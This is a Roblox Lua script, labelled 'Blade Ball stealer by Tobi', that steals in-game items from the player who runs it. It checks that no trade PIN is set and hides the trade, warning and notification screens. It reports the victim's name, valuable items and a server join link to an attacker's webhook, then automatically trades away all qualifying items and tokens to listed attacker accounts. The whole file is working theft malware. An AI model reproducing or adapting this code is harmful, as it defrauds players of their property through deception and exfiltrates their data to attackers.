-- // CONFIGURATION & EXECUTION CHECK
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add usernames or webhook")
    return
end

if game.PlaceId ~= 13772394625 then
    plr:kick("Game not supported. Please join a normal Blade Ball server")
    return
end

if #Players:GetPlayers() >= 16 then
    plr:kick("Server is full. Please join a less populated server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

local args = {
    [1] = {
        ["option"] = "PIN",
        ["value"] = "9079"
    }
}
local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
if PINReponse ~= "You don't have a PIN code" then
    plr:kick("Account error. Please disable trade PIN and try again")
    return
end

tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false

local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function()
    maintradegui.Visible = false
end)
local unfairTade = tradeGui.UnfairTradeWarning
unfairTade.Visible = false
unfairTade:GetPropertyChangedSignal("Visible"):Connect(function()
    unfairTade.Visible = false
end)
local notificationsFrame = notificationsGui.Notifications
notificationsFrame.Visible = false
notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    notificationsFrame.Visible = false
end)

-- // GESTION INTRADE + CACHER TEXTE TRADING
tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
    if inTrade then
        task.spawn(function()
            local char = plr.Character
            if char then
                for i = 1, 20 do
                    for _, obj in ipairs(char:GetDescendants()) do
                        if obj:IsA("BillboardGui") then obj:Destroy() end
                    end
                    task.wait(0.1)
                end
            end
        end)
    end
end)

local function sendTradeRequest(user)
    local target = game:GetService("Players"):WaitForChild(user)
    repeat
        wait(0.5)
        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
    until inTrade == true
end

local function addItemToTrade(itemType, ID)
    local args = { [1] = itemType, [2] = ID }
    netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args))
end

-- // TES FONCTIONS DE CONFIRMATION (RE-CORRIGÉES POUR LA PERSISTENCE)
local function readyTrade()
    repeat
        wait(0.2)
        local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
    until not inTrade or response == true
end

local function confirmTrade()
    repeat
        wait(0.2)
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
    until not inTrade
end

local function formatNumber(number)
    if number == nil then return "0" end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local totalRAP = 0

-- // WEBHOOKS (Gardés intacts)
local function SendJoinMessage(list, prefix)
    local title = (totalRAP >= 500) and "\240\159\155\162 GOOD HIT" or "\240\159\148\180 Join to get Blade Ball hit"
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Join link:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId},
        {name = "Item list:", value = "", inline = false},
        {name = "Summary:", value = string.format("Total RAP: %s", formatNumber(totalRAP)), inline = false}
    }
    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then grouped[item.Name].Count = grouped[item.Name].Count + 1 grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP} end
    end
    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end
    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
    for _, group in ipairs(groupedList) do
        fields[3].value = fields[3].value .. string.format("%s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
    end
    if #fields[3].value > 1000 then fields[3].value = string.sub(fields[3].value, 1, 1000) .. "\nPlus more!" end
    
    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{["title"] = title, ["color"] = (totalRAP >= 500 and 65280 or 16711680), ["fields"] = fields, ["footer"] = {["text"] = "Blade Ball stealer by Tobi"}}}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

local function SendMessage(list)
    local fields = {{name = "Victim Username:", value = plr.Name, inline = true}, {name = "Items sent:", value = "", inline = false}, {name = "Summary:", value = string.format("Total RAP: %s", formatNumber(totalRAP)), inline = false}}
    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then grouped[item.Name].Count = grouped[item.Name].Count + 1 grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP} end
    end
    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end
    for _, group in ipairs(groupedList) do fields[2].value = fields[2].value .. string.format("%s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP)) end

    local data = {["embeds"] = {{["title"] = "\240\159\148\180 New Blade Ball Execution", ["color"] = 65280, ["fields"] = fields, ["footer"] = {["text"] = "Blade Ball stealer by Tobi"}}}}
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

-- // SCAN RAP
local rapDataResult = Replion.Client:GetReplion("ItemRAP")
local rapData = rapDataResult.Data.Items

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    if not rapData[category] then return nameToRAP end
    for serializedKey, rap in pairs(rapData[category]) do
        local success, decodedKey = pcall(function() return HttpService:JSONDecode(serializedKey) end)
        if success and type(decodedKey) == "table" then
            for _, pair in ipairs(decodedKey) do if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end end
        end
    end
    return nameToRAP
end

local rapMappings = {}
for _, category in ipairs(categories) do rapMappings[category] = buildNameToRAPMap(category) end

for _, category in ipairs(categories) do
    if clientInventory[category] then
        for itemId, itemInfo in pairs(clientInventory[category]) do
            if not itemInfo.TradeLock then
                local rap = (rapMappings[category] and rapMappings[category][itemInfo.Name]) or 0
                if rap >= min_rap then
                    totalRAP = totalRAP + rap
                    table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
                end
            end
        end
    end
end

-- // EXECUTION
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    local sentItems = {}
    for i, v in ipairs(itemsToSend) do sentItems[i] = v end

    SendJoinMessage(itemsToSend, (ping == "Yes") and "--[[@everyone]] " or "")

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            sendTradeRequest(joinedUser)
            repeat wait(0.5) until inTrade

            local batchSize = 100
            local currentBatch = {}
            for i = 1, math.min(batchSize, #itemsToSend) do
                table.insert(currentBatch, table.remove(itemsToSend, 1))
            end

            for _, item in ipairs(currentBatch) do
                addItemToTrade(item.itemType, item.ItemID)
            end

            -- // FIX CHEMIN TOKENS
            local tokensPath = tradeGui.Main.Currency.Coins.Amount
            local tokensamount = tonumber(tokensPath.Text:gsub("[^%d]", "")) or 0
            if tokensamount >= 1 then
                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
            end

            wait(1.5) -- Laisser le temps à l'autre de mettre son stuff
            readyTrade()
            confirmTrade()
        end
        plr:kick("Error conection")
    end

    local function waitForUserJoin()
        local sentMessage = false
        local function onUserJoin(player)
            if table.find(users, player.Name) then
                if not sentMessage then SendMessage(sentItems) sentMessage = true end
                doTrade(player.Name)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
        Players.PlayerAdded:Connect(onUserJoin)
    end
    waitForUserJoin()
end
